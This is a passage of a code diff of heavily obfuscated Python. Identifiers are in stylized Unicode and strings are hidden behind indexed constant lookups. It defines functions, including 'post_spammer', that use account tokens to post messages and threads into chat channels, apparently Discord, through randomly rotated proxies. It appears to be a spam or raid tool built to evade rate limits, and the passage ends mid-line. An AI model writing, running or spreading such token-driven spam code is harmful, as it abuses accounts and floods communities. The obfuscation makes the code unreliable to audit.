-    𝙥𝙖𝘆𝙡𝘰𝘢𝙙 = {𝘕𝙈𝘔𝗠𝘕𝗹𝗹𝘔𝗠𝗹𝙈𝙈𝗡𝗹𝘐𝘔𝗜𝘐𝙉𝗠𝘐𝙄𝙈𝙄𝗹𝗜𝙉𝘐𝘔𝗜𝘐𝗠[160]: 𝗻𝗮𝗺𝗲, 𝙉𝘔𝗠𝘔𝙉𝗹𝘭𝙈𝗠𝗹𝗠𝙈𝗡𝗹𝗜𝙈𝙄𝙄𝘕𝗠𝙄𝗜𝗠𝗜𝙡𝗜𝙉𝙄𝘔𝙄𝗜𝗠[312]: 11, 𝗡𝗠𝗠𝙈𝘕𝙡𝘭𝘔𝗠𝗹𝗠𝙈𝘕𝗹𝙄𝗠𝗜𝘐𝗡𝗠𝙄𝗜𝘔𝙄𝗹𝗜𝗡𝗜𝙈𝙄𝘐𝙈[313]: 4320, 𝗡𝘔𝗠𝙈𝙉𝙡𝘭𝘔𝗠𝘭𝙈𝘔𝗡𝗹𝗜𝗠𝘐𝗜𝗡𝗠𝙄𝘐𝙈𝙄𝙡𝗜𝘕𝗜𝘔𝗜𝙄𝙈[314]: 𝗡𝘔𝙈𝙈𝘕𝘭𝙡𝙈𝘔𝗹𝘔𝗠𝘕𝙡𝗜𝘔𝙄𝙄𝗡𝗠𝗜𝙄𝗠𝗜𝙡𝙄𝙉𝙄𝗠𝙄𝗜𝗠[315]}
-    𝙙𝘯 = 𝙩𝙤𝙠𝗲𝗻.split(𝘕𝙈𝙈𝙈𝙉𝙡𝗹𝙈𝘔𝙡𝙈𝙈𝗡𝗹𝙄𝗠𝘐𝗜𝙉𝙈𝘐𝙄𝙈𝙄𝗹𝘐𝘕𝙄𝙈𝗜𝗜𝘔[254])
-    𝗻𝘯 = 𝙙𝘯[0]
-    for _ in 𝘳𝗮𝗻𝙜𝗲(1):
-        if 𝙥𝗿𝙤𝘹𝘆:
-            𝙧𝘳 = 𝗿𝗲𝘲𝘂𝙚𝘴𝙩𝘀.post(f'{𝙉𝘔𝙈𝘔𝗡𝙡𝙡𝙈𝘔𝙡𝙈𝘔𝗡𝘭𝙄𝘔𝗜𝙄𝗡𝗠𝗜𝙄𝗠𝙄𝙡𝗜𝗡𝙄𝘔𝙄𝗜𝘔[273]}{𝘤𝙝𝙖𝘯𝙣𝙚𝙡}{𝙉𝘔𝙈𝗠𝗡𝙡𝘭𝘔𝙈𝘭𝙈𝙈𝗡𝗹𝙄𝙈𝙄𝙄𝘕𝘔𝗜𝙄𝙈𝘐𝘭𝙄𝙉𝘐𝘔𝙄𝘐𝗠[316]}', headers=𝙝𝘦𝘢𝘥𝗲𝗿𝙨, json=𝗽𝗮𝙮𝘭𝘰𝘢𝗱, proxy={𝗡𝗠𝙈𝙈𝘕𝙡𝘭𝙈𝗠𝙡𝙈𝗠𝗡𝙡𝗜𝗠𝗜𝙄𝙉𝗠𝗜𝘐𝘔𝗜𝙡𝙄𝘕𝗜𝙈𝙄𝙄𝘔[251]: 𝘕𝙈𝙈𝗠𝗡𝗹𝗹𝘔𝙈𝙡𝙈𝗠𝙉𝗹𝘐𝗠𝙄𝗜𝙉𝗠𝗜𝗜𝙈𝘐𝘭𝘐𝗡𝘐𝙈𝙄𝗜𝘔[253] + 𝗿𝙖𝘯𝘥𝙤𝗺.choice(𝘱𝘳𝙤𝘅𝗶𝘦𝘴), 𝘕𝘔𝗠𝘔𝘕𝘭𝘭𝗠𝗠𝙡𝗠𝘔𝗡𝙡𝗜𝘔𝗜𝙄𝘕𝘔𝘐𝗜𝗠𝗜𝘭𝙄𝙉𝙄𝘔𝙄𝗜𝙈[252]: 𝙉𝙈𝗠𝗠𝘕𝗹𝙡𝗠𝙈𝘭𝘔𝙈𝙉𝘭𝘐𝙈𝘐𝙄𝙉𝗠𝙄𝘐𝗠𝙄𝗹𝘐𝗡𝘐𝘔𝙄𝙄𝗠[253] + 𝗿𝘢𝘯𝗱𝘰𝘮.choice(𝘱𝘳𝙤𝙭𝗶𝗲𝙨)})
+    𝙝𝗲𝗮𝗱𝗲𝘳𝘴 = 𝘏𝗲𝙖𝘥𝙚𝘳𝙨(𝘵𝘰𝘬𝙚𝙣)
+    𝗽𝘢𝙮𝘭𝗼𝙖𝙙 = {𝙄𝙉𝘐𝘕𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝘔𝗹𝙡𝘐𝙡𝘭𝗡𝗡𝗜𝙡𝙡𝙈𝙉𝘭𝙉𝙡𝗠𝙄𝘔𝗜𝙈[153]: 𝗻𝘢𝙢𝗲, 𝙄𝗡𝘐𝗡𝘭𝗹𝘐𝙈𝘐𝗜𝗹𝙈𝘭𝘭𝘐𝗹𝘭𝗡𝘕𝙄𝙡𝗹𝘔𝗡𝗹𝗡𝘭𝙈𝗜𝘔𝘐𝙈[305]: 11, 𝙄𝘕𝙄𝗡𝙡𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝙡𝘐𝗹𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝗡𝙡𝙉𝗹𝙈𝗜𝗠𝙄𝘔[306]: 4320, 𝘐𝗡𝗜𝙉𝙡𝗹𝗜𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝙡𝗹𝗡𝗡𝗜𝗹𝗹𝗠𝗡𝙡𝗡𝙡𝗠𝘐𝘔𝗜𝗠[307]: 𝘐𝗡𝗜𝘕𝗹𝙡𝗜𝗠𝙄𝙄𝘭𝘔𝘭𝗹𝘐𝗹𝙡𝘕𝙉𝙄𝙡𝘭𝗠𝗡𝙡𝘕𝙡𝗠𝗜𝙈𝗜𝙈[308]}
+    𝙙𝘯 = 𝙩𝗼𝙠𝙚𝗻.split(𝗜𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝗹𝙈𝙡𝘭𝙄𝗹𝘭𝘕𝘕𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝗹𝘔𝘐𝘔𝙄𝗠[247])
+    𝘯𝗻 = 𝘥𝗻[0]
+    for _ in 𝗿𝗮𝗻𝗴𝘦(1):
+        if 𝙥𝘳𝗼𝙭𝘺:
+            𝙧𝘳 = 𝗿𝙚𝙦𝙪𝗲𝘀𝘁𝙨.post(f'{𝙄𝙉𝙄𝙉𝙡𝙡𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝘭𝙄𝗹𝗹𝗡𝘕𝙄𝘭𝙡𝙈𝙉𝘭𝘕𝗹𝘔𝙄𝙈𝗜𝗠[266]}{𝘤𝘩𝗮𝗻𝙣𝘦𝘭}{𝙄𝘕𝗜𝙉𝙡𝘭𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝙡𝙡𝙉𝙉𝘐𝙡𝙡𝘔𝗡𝙡𝙉𝘭𝘔𝗜𝘔𝘐𝘔[309]}', headers=𝙝𝙚𝙖𝙙𝙚𝙧𝘀, json=𝘱𝗮𝙮𝘭𝙤𝘢𝙙, proxy={𝘐𝙉𝙄𝗡𝗹𝘭𝙄𝙈𝘐𝙄𝙡𝙈𝙡𝘭𝙄𝗹𝙡𝘕𝘕𝙄𝗹𝘭𝗠𝘕𝗹𝘕𝘭𝗠𝘐𝗠𝙄𝙈[244]: 𝙄𝙉𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝘭𝙈𝙡𝗹𝘐𝙡𝗹𝘕𝗡𝙄𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝗠𝗜𝗠𝗜𝗠[246] + 𝙧𝘢𝘯𝘥𝙤𝙢.choice(𝗽𝘳𝙤𝙭𝗶𝘦𝘀), 𝙄𝘕𝙄𝙉𝘭𝘭𝗜𝗠𝙄𝗜𝗹𝙈𝘭𝙡𝗜𝘭𝗹𝘕𝗡𝗜𝙡𝙡𝘔𝗡𝘭𝗡𝙡𝘔𝙄𝘔𝘐𝗠[245]: 𝙄𝗡𝙄𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝗹𝙈𝗹𝘭𝘐𝗹𝗹𝗡𝗡𝘐𝘭𝙡𝗠𝙉𝙡𝘕𝘭𝘔𝗜𝙈𝘐𝙈[246] + 𝗿𝙖𝙣𝙙𝗼𝙢.choice(𝘱𝗿𝗼𝙭𝗶𝘦𝙨)})
         else:
-            𝗿𝘳 = 𝘳𝘦𝘲𝙪𝗲𝘀𝙩𝘴.post(f'{𝘕𝗠𝘔𝙈𝘕𝘭𝗹𝘔𝙈𝗹𝗠𝗠𝗡𝘭𝙄𝗠𝗜𝗜𝗡𝙈𝗜𝘐𝗠𝘐𝙡𝙄𝙉𝘐𝘔𝘐𝗜𝙈[273]}{𝙘𝙝𝘢𝘯𝙣𝘦𝙡}{𝘕𝘔𝘔𝘔𝘕𝙡𝗹𝘔𝘔𝙡𝘔𝙈𝘕𝙡𝘐𝗠𝗜𝘐𝘕𝘔𝘐𝗜𝙈𝗜𝘭𝘐𝙉𝙄𝙈𝘐𝙄𝙈[316]}', headers=𝘩𝘦𝘢𝘥𝗲𝘳𝘀, json=𝙥𝗮𝘆𝗹𝗼𝙖𝗱)
-    if 𝗿𝗿.status_code == 201:
-        𝗽𝗿𝘪𝘯𝘵(f"{𝗿}{𝘕𝗠𝗠𝘔𝙉𝙡𝙡𝙈𝗠𝘭𝗠𝗠𝗡𝗹𝗜𝘔𝙄𝙄𝘕𝘔𝘐𝘐𝙈𝗜𝙡𝗜𝘕𝙄𝘔𝙄𝙄𝘔[98]}{𝗱𝗮𝘵𝗲𝘵𝙞𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝗡𝙈𝘔𝘔𝘕𝗹𝗹𝙈𝙈𝙡𝙈𝙈𝗡𝙡𝗜𝙈𝗜𝘐𝗡𝗠𝗜𝗜𝗠𝗜𝗹𝗜𝗡𝙄𝙈𝘐𝗜𝗠[99]}{𝙧}')}{𝘕𝗠𝗠𝘔𝘕𝙡𝗹𝘔𝙈𝘭𝘔𝗠𝘕𝘭𝘐𝘔𝙄𝗜𝘕𝗠𝘐𝙄𝙈𝘐𝙡𝗜𝘕𝘐𝙈𝗜𝘐𝘔[100]}{𝘳}{𝘕𝙈𝘔𝙈𝗡𝗹𝙡𝗠𝙈𝗹𝘔𝗠𝘕𝘭𝘐𝙈𝙄𝙄𝗡𝘔𝘐𝘐𝗠𝗜𝘭𝘐𝙉𝙄𝗠𝘐𝗜𝗠[98]}{𝗹𝙘}{𝙉𝗠𝗠𝗠𝗡𝙡𝙡𝘔𝗠𝙡𝙈𝙈𝙉𝘭𝗜𝙈𝗜𝙄𝙉𝘔𝘐𝘐𝘔𝘐𝗹𝙄𝗡𝘐𝘔𝘐𝙄𝘔[308]}{𝙧}{𝘕𝗠𝗠𝘔𝘕𝙡𝙡𝙈𝗠𝘭𝘔𝘔𝘕𝗹𝗜𝗠𝘐𝗜𝙉𝗠𝗜𝙄𝙈𝗜𝙡𝙄𝘕𝘐𝙈𝘐𝗜𝙈[100]}{𝘯𝘯}{𝗴}{𝗡𝘔𝙈𝙈𝙉𝗹𝗹𝗠𝘔𝘭𝗠𝘔𝘕𝙡𝙄𝙈𝘐𝘐𝙉𝘔𝗜𝙄𝘔𝙄𝙡𝗜𝘕𝙄𝗠𝘐𝙄𝘔[256]}")
+            𝘳𝙧 = 𝘳𝗲𝗾𝘶𝙚𝘀𝘁𝘀.post(f'{𝙄𝙉𝙄𝙉𝙡𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝗹𝗹𝗜𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝗡𝙡𝘕𝙡𝙈𝗜𝘔𝙄𝗠[266]}{𝘤𝘩𝘢𝗻𝘯𝘦𝙡}{𝗜𝙉𝙄𝗡𝙡𝘭𝘐𝗠𝙄𝗜𝘭𝘔𝙡𝘭𝗜𝗹𝗹𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝙡𝘕𝙡𝙈𝙄𝙈𝙄𝘔[309]}', headers=𝘩𝙚𝙖𝗱𝙚𝙧𝘀, json=𝘱𝗮𝘆𝗹𝗼𝙖𝘥)
+    if 𝘳𝙧.status_code == 201:
+        𝙥𝗿𝗶𝗻𝘵(f"{𝗿}{𝘐𝘕𝙄𝗡𝗹𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝘐𝘭𝗹𝘕𝘕𝙄𝙡𝗹𝘔𝙉𝘭𝘕𝘭𝙈𝘐𝘔𝗜𝘔[91]}{𝘥𝗮𝘁𝙚𝘵𝗶𝘮𝘦.datetime.now().strftime(f'{𝙜}{𝙄𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝙄𝗜𝙡𝘔𝙡𝘭𝙄𝘭𝗹𝘕𝘕𝗜𝗹𝗹𝙈𝙉𝙡𝙉𝗹𝘔𝘐𝙈𝙄𝙈[92]}{𝙧}')}{𝘐𝙉𝗜𝙉𝗹𝙡𝘐𝘔𝙄𝗜𝘭𝘔𝙡𝘭𝙄𝗹𝗹𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝘭𝙉𝙡𝗠𝗜𝗠𝗜𝘔[93]}{𝙧}{𝘐𝗡𝙄𝗡𝗹𝙡𝙄𝙈𝘐𝗜𝙡𝙈𝘭𝘭𝘐𝗹𝙡𝙉𝙉𝘐𝘭𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝘔𝗜𝙈[91]}{𝗹𝙘}{𝙄𝙉𝗜𝙉𝙡𝘭𝙄𝘔𝘐𝘐𝘭𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝘕𝗜𝗹𝘭𝘔𝙉𝙡𝗡𝙡𝘔𝘐𝘔𝙄𝗠[301]}{𝘳}{𝙄𝘕𝙄𝘕𝗹𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝘭𝗹𝘐𝙡𝘭𝘕𝗡𝙄𝙡𝙡𝘔𝗡𝗹𝙉𝙡𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝘨}{𝙄𝘕𝗜𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝗹𝙈𝘭𝘭𝘐𝙡𝘭𝘕𝗡𝘐𝗹𝗹𝗠𝙉𝘭𝗡𝘭𝗠𝘐𝘔𝙄𝙈[249]}")
     else:
-        𝙥𝗿𝘪𝗻𝙩(f"{𝘳}{𝘕𝘔𝙈𝙈𝘕𝙡𝗹𝗠𝗠𝙡𝗠𝙈𝗡𝙡𝙄𝙈𝙄𝙄𝘕𝙈𝗜𝙄𝗠𝙄𝘭𝘐𝘕𝘐𝘔𝙄𝘐𝘔[98]}{𝗱𝗮𝘁𝘦𝘵𝙞𝙢𝘦.datetime.now().strftime(f'{𝘨}{𝘕𝘔𝙈𝘔𝘕𝙡𝘭𝗠𝘔𝙡𝗠𝘔𝗡𝗹𝘐𝗠𝗜𝗜𝗡𝙈𝘐𝙄𝘔𝗜𝗹𝙄𝙉𝘐𝙈𝘐𝙄𝗠[99]}{𝗿}')}{𝙉𝘔𝗠𝘔𝘕𝗹𝘭𝙈𝙈𝗹𝘔𝗠𝘕𝗹𝗜𝗠𝙄𝘐𝗡𝗠𝗜𝙄𝙈𝘐𝙡𝙄𝙉𝙄𝘔𝙄𝘐𝗠[100]}{𝗿}{𝗡𝘔𝗠𝙈𝘕𝘭𝙡𝙈𝘔𝙡𝗠𝘔𝘕𝗹𝗜𝙈𝘐𝘐𝙉𝘔𝘐𝗜𝙈𝗜𝙡𝙄𝘕𝘐𝙈𝗜𝗜𝗠[98]}{𝘣}{𝗡𝗠𝙈𝙈𝙉𝗹𝗹𝙈𝙈𝘭𝙈𝘔𝙉𝘭𝘐𝙈𝗜𝗜𝘕𝗠𝘐𝗜𝙈𝗜𝗹𝘐𝘕𝙄𝙈𝙄𝗜𝗠[276]}{𝙧}{𝘕𝙈𝘔𝙈𝗡𝘭𝘭𝘔𝘔𝘭𝘔𝗠𝙉𝘭𝙄𝘔𝙄𝘐𝗡𝗠𝘐𝘐𝘔𝙄𝙡𝘐𝘕𝙄𝙈𝙄𝗜𝗠[100]}{𝙣𝗻}{𝗴}{𝙉𝗠𝙈𝘔𝙉𝙡𝘭𝙈𝙈𝙡𝘔𝗠𝗡𝗹𝘐𝙈𝙄𝙄𝙉𝗠𝘐𝘐𝗠𝗜𝘭𝘐𝘕𝙄𝙈𝙄𝘐𝙈[277]}{𝙧𝘳.text}")
+        𝘱𝙧𝘪𝙣𝘁(f"{𝗿}{𝗜𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝗜𝙄𝘭𝙈𝘭𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝘭𝘔𝙉𝙡𝘕𝙡𝘔𝙄𝙈𝘐𝙈[91]}{𝙙𝗮𝙩𝗲𝙩𝘪𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝗜𝙉𝗜𝘕𝘭𝗹𝗜𝘔𝙄𝘐𝙡𝘔𝗹𝘭𝙄𝙡𝗹𝙉𝘕𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝙡𝗠𝙄𝙈𝙄𝗠[92]}{𝘳}')}{𝘐𝗡𝘐𝗡𝘭𝙡𝙄𝗠𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝙡𝘭𝗡𝗡𝙄𝗹𝗹𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝙈𝗜𝗠[93]}{𝘳}{𝗜𝘕𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝘭𝗜𝘭𝙡𝙉𝗡𝘐𝗹𝘭𝗠𝘕𝙡𝙉𝘭𝙈𝙄𝘔𝘐𝙈[91]}{𝙗}{𝘐𝙉𝘐𝗡𝗹𝘭𝙄𝘔𝙄𝙄𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝙉𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝙉𝙡𝗠𝙄𝙈𝙄𝘔[269]}{𝗿}{𝗜𝘕𝗜𝗡𝘭𝘭𝘐𝘔𝘐𝘐𝘭𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝙉𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝙈[93]}{𝗻𝘯}{𝘨}{𝙄𝘕𝙄𝘕𝙡𝗹𝗜𝘔𝙄𝘐𝗹𝗠𝙡𝙡𝘐𝗹𝙡𝙉𝙉𝘐𝙡𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝙄𝙈𝘐𝗠[270]}{𝘳𝘳.text}")
 
 def post_spammer(token, channel, name, msg):
-    𝘩𝗲𝗮𝗱𝘦𝘳𝘀 = 𝗛𝙚𝙖𝘥𝘦𝘳𝘴(𝘁𝙤𝘬𝘦𝙣)
-    𝘥𝘯 = 𝘵𝘰𝙠𝙚𝘯.split(𝙉𝘔𝙈𝙈𝘕𝙡𝗹𝗠𝙈𝙡𝘔𝗠𝘕𝗹𝗜𝗠𝗜𝗜𝙉𝘔𝘐𝗜𝙈𝙄𝗹𝘐𝘕𝗜𝘔𝘐𝙄𝘔[254])
-    𝙣𝗻 = 𝗱𝗻[0]
-    𝘱𝙖𝙮𝗹𝙤𝘢𝙙 = {𝙉𝗠𝗠𝗠𝙉𝗹𝙡𝗠𝙈𝙡𝙈𝗠𝗡𝗹𝘐𝘔𝙄𝘐𝘕𝘔𝗜𝙄𝙈𝙄𝗹𝘐𝙉𝘐𝗠𝘐𝙄𝘔[160]: 𝘯𝙖𝙢𝙚, 𝙉𝗠𝙈𝙈𝗡𝗹𝗹𝗠𝙈𝙡𝗠𝘔𝙉𝗹𝙄𝘔𝙄𝗜𝙉𝗠𝗜𝘐𝘔𝙄𝙡𝘐𝙉𝗜𝙈𝙄𝘐𝙈[313]: 4320, 𝙉𝗠𝘔𝙈𝙉𝘭𝙡𝙈𝙈𝘭𝙈𝘔𝙉𝘭𝗜𝗠𝙄𝙄𝙉𝗠𝙄𝙄𝘔𝘐𝗹𝘐𝗡𝘐𝘔𝘐𝗜𝗠[317]: [], 𝗡𝙈𝗠𝙈𝘕𝙡𝘭𝗠𝘔𝗹𝙈𝗠𝙉𝘭𝙄𝘔𝙄𝙄𝗡𝙈𝘐𝗜𝘔𝗜𝗹𝘐𝘕𝗜𝗠𝘐𝘐𝙈[155]: {𝗡𝗠𝘔𝙈𝘕𝘭𝗹𝗠𝘔𝘭𝗠𝘔𝙉𝙡𝙄𝗠𝗜𝗜𝘕𝘔𝗜𝗜𝗠𝙄𝙡𝗜𝙉𝙄𝘔𝘐𝗜𝗠[272]: 𝙢𝙨𝙜}}
-    𝘴𝙡𝗲𝙚𝗽(1)
-    if 𝙥𝘳𝗼𝙭𝙮:
-        𝘳𝗿 = 𝙧𝙚𝗾𝘂𝗲𝘴𝙩𝘴.post(f'{𝗡𝙈𝙈𝘔𝗡𝗹𝙡𝘔𝙈𝗹𝙈𝘔𝘕𝗹𝘐𝙈𝙄𝘐𝘕𝘔𝘐𝗜𝗠𝗜𝘭𝙄𝘕𝙄𝙈𝙄𝗜𝙈[273]}{𝘤𝙝𝙖𝘯𝘯𝗲𝙡}{𝗡𝘔𝘔𝗠𝙉𝙡𝗹𝙈𝙈𝙡𝙈𝘔𝘕𝗹𝘐𝙈𝙄𝙄𝘕𝘔𝗜𝘐𝙈𝙄𝘭𝗜𝗡𝙄𝘔𝙄𝘐𝘔[318]}', json=𝙥𝘢𝙮𝗹𝘰𝘢𝙙, headers=𝙝𝗲𝘢𝘥𝙚𝘳𝘴, proxy={𝙉𝙈𝙈𝗠𝗡𝘭𝘭𝘔𝙈𝘭𝗠𝘔𝗡𝗹𝙄𝘔𝙄𝙄𝘕𝙈𝘐𝗜𝘔𝘐𝗹𝗜𝗡𝙄𝙈𝘐𝘐𝙈[251]: 𝙉𝘔𝙈𝘔𝘕𝘭𝘭𝙈𝘔𝗹𝙈𝘔𝗡𝗹𝘐𝙈𝘐𝘐𝘕𝘔𝗜𝙄𝘔𝗜𝘭𝘐𝙉𝙄𝘔𝗜𝘐𝘔[253] + 𝙧𝗮𝘯𝘥𝗼𝙢.choice(𝙥𝗿𝘰𝙭𝗶𝗲𝘴), 𝗡𝗠𝘔𝗠𝗡𝗹𝙡𝙈𝗠𝗹𝘔𝘔𝙉𝘭𝘐𝙈𝘐𝙄𝗡𝗠𝘐𝙄𝗠𝙄𝙡𝗜𝙉𝗜𝘔𝗜𝙄𝘔[252]: 𝙉𝗠𝘔𝙈𝙉𝗹𝘭𝘔𝙈𝙡𝗠𝗠𝗡𝙡𝗜𝗠𝙄𝗜𝗡𝗠𝘐𝗜𝗠𝘐𝙡𝗜𝗡𝘐𝘔𝘐𝙄𝙈[253] + 𝘳𝙖𝙣𝘥𝘰𝗺.choice(𝘱𝗿𝗼𝘅𝘪𝘦𝘴)})
+    𝘩𝘦𝙖𝘥𝙚𝗿𝘀 = 𝗛𝘦𝘢𝗱𝗲𝙧𝘀(𝘵𝗼𝘬𝘦𝗻)
+    𝘥𝗻 = 𝙩𝘰𝘬𝘦𝗻.split(𝙄𝘕𝙄𝘕𝘭𝘭𝗜𝘔𝗜𝘐𝘭𝘔𝘭𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝙉𝙡𝗠𝘐𝙈𝗜𝘔[247])
+    𝙣𝘯 = 𝗱𝘯[0]
+    𝙥𝘢𝙮𝘭𝙤𝘢𝙙 = {𝘐𝙉𝘐𝗡𝙡𝗹𝘐𝘔𝘐𝗜𝘭𝙈𝘭𝙡𝙄𝗹𝘭𝗡𝘕𝙄𝗹𝙡𝙈𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝘐𝘔[153]: 𝘯𝘢𝘮𝗲, 𝗜𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝙄𝗜𝗹𝙈𝗹𝙡𝙄𝗹𝗹𝗡𝘕𝘐𝘭𝙡𝙈𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝗜𝗠[306]: 4320, 𝗜𝙉𝘐𝘕𝗹𝗹𝗜𝙈𝘐𝙄𝙡𝘔𝗹𝘭𝘐𝙡𝙡𝘕𝗡𝙄𝗹𝗹𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝗠𝘐𝗠[310]: [], 𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝘔𝗜𝗜𝙡𝗠𝗹𝗹𝙄𝗹𝙡𝗡𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝙉𝙡𝗠𝘐𝗠𝙄𝙈[148]: {𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝘔𝘐𝗜𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝗡𝘕𝘐𝗹𝗹𝘔𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝗜𝙈[265]: 𝘮𝘀𝙜}}
+    𝘴𝘭𝘦𝘦𝙥(1)
+    if 𝙥𝘳𝗼𝘅𝘆:
+        𝘳𝙧 = 𝙧𝘦𝗾𝙪𝗲𝘴𝙩𝙨.post(f'{𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝙄𝗜𝘭𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝗡𝗜𝘭𝘭𝗠𝘕𝗹𝗡𝘭𝙈𝙄𝘔𝘐𝙈[266]}{𝙘𝗵𝙖𝘯𝙣𝙚𝘭}{𝗜𝗡𝘐𝙉𝙡𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝙄𝗹𝙡𝘕𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝙡𝘔𝗜𝙈𝙄𝗠[311]}', json=𝗽𝘢𝘆𝗹𝗼𝘢𝘥, headers=𝙝𝙚𝘢𝙙𝙚𝙧𝙨, proxy={𝘐𝘕𝗜𝘕𝗹𝙡𝘐𝘔𝙄𝙄𝙡𝙈𝙡𝗹𝙄𝘭𝙡𝙉𝙉𝙄𝗹𝙡𝘔𝘕𝘭𝙉𝗹𝘔𝗜𝗠𝗜𝙈[244]: 𝙄𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝗜𝘐𝘭𝙈𝘭𝗹𝙄𝘭𝘭𝗡𝗡𝙄𝙡𝗹𝗠𝙉𝗹𝘕𝗹𝘔𝗜𝘔𝙄𝘔[246] + 𝘳𝘢𝙣𝙙𝘰𝙢.choice(𝘱𝗿𝘰𝘹𝙞𝗲𝙨), 𝘐𝗡𝙄𝘕𝙡𝙡𝘐𝙈𝗜𝗜𝘭𝘔𝗹𝙡𝙄𝙡𝗹𝙉𝗡𝘐𝗹𝘭𝘔𝙉𝘭𝘕𝗹𝗠𝘐𝗠𝙄𝙈[245]: 𝙄𝗡𝙄𝗡𝗹𝙡𝘐𝘔𝘐𝘐𝘭𝗠𝗹𝙡𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝘔𝘕𝙡𝗡𝗹𝙈𝗜𝘔𝙄𝗠[246] + 𝘳𝙖𝘯𝗱𝗼𝘮.choice(𝙥𝙧𝘰𝙭𝗶𝙚𝘴)})
     else:
-        𝙧𝘳 = 𝙧𝘦𝗾𝙪𝘦𝘀𝘁𝘴.post(f'{𝘕𝗠𝗠𝘔𝙉𝘭𝗹𝘔𝙈𝗹𝗠𝗠𝙉𝘭𝘐𝙈𝙄𝗜𝙉𝗠𝙄𝙄𝙈𝗜𝙡𝘐𝘕𝙄𝘔𝙄𝘐𝙈[273]}{𝘤𝙝𝘢𝙣𝗻𝙚𝙡}{𝗡𝙈𝗠𝗠𝙉𝙡𝙡𝗠𝙈𝗹𝗠𝘔𝙉𝙡𝙄𝗠𝗜𝘐𝙉𝗠𝙄𝙄𝙈𝘐𝘭𝗜𝘕𝙄𝙈𝘐𝘐𝘔[318]}', json=𝗽𝙖𝘆𝗹𝙤𝘢𝘥, headers=𝗵𝗲𝗮𝗱𝙚𝙧𝘴)
+        𝗿𝙧 = 𝘳𝙚𝘲𝙪𝗲𝘀𝘁𝘴.post(f'{𝙄𝘕𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝙡𝙡𝘐𝘭𝘭𝙉𝗡𝗜𝙡𝘭𝗠𝙉𝘭𝘕𝙡𝗠𝗜𝙈𝗜𝙈[266]}{𝙘𝗵𝗮𝗻𝗻𝗲𝗹}{𝘐𝗡𝘐𝘕𝙡𝗹𝙄𝘔𝘐𝗜𝘭𝗠𝘭𝙡𝙄𝘭𝙡𝗡𝙉𝗜𝗹𝗹𝘔𝘕𝙡𝘕𝙡𝘔𝙄𝘔𝙄𝙈[311]}', json=𝗽𝗮𝘆𝙡𝘰𝙖𝘥, headers=𝗵𝙚𝙖𝙙𝗲𝘳𝙨)
     if 𝙧𝘳.status_code == 201:
-        𝙥𝗿𝘪𝘯𝘵(f"{𝗿}{𝗡𝗠𝗠𝙈𝗡𝙡𝗹𝙈𝗠𝗹𝙈𝘔𝙉𝗹𝗜𝙈𝙄𝙄𝘕𝗠𝗜𝙄𝗠𝗜𝙡𝗜𝘕𝘐𝘔𝙄𝘐𝗠[98]}{𝗱𝙖𝘵𝘦𝙩𝘪𝘮𝙚.datetime.now().strftime(f'{𝘨}{𝘕𝗠𝙈𝙈𝗡𝘭𝗹𝗠𝙈𝗹𝙈𝙈𝙉𝙡𝘐𝗠𝙄𝗜𝙉𝘔𝘐𝗜𝙈𝗜𝙡𝙄𝘕𝗜𝗠𝗜𝗜𝙈[99]}{𝙧}')}{𝗡𝘔𝙈𝗠𝗡𝘭𝘭𝙈𝘔𝘭𝘔𝗠𝙉𝗹𝘐𝙈𝘐𝙄𝙉𝗠𝗜𝗜𝙈𝗜𝘭𝗜𝘕𝗜𝙈𝘐𝘐𝗠[100]}{𝘳}{𝙉𝘔𝗠𝙈𝙉𝗹𝗹𝙈𝗠𝗹𝙈𝘔𝗡𝙡𝘐𝙈𝗜𝗜𝗡𝗠𝗜